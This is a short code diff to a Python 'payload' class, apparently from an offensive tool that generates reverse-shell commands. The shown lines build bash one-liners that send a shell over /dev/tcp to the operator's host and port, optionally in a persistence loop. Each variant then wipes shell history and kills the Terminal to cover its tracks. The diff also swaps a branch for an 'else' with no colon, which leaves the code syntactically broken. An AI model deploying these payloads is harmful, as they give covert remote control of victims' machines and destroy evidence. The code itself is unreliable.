@@ -35,13 +35,10 @@ class payload:
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				shell_clean = "history -wc;killall Terminal"
 				break
-			elif persistence == "n" or not persistence:
+			else
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
 				shell_clean = "history -wc;killall Terminal"
 				break
-			else:
-				h.info_error("Unrecognized option!")
-
 		shell_command += "history -wc;killall Terminal"
 		if os.path.exists("payloads") == False:
 			os.mkdir("payloads")
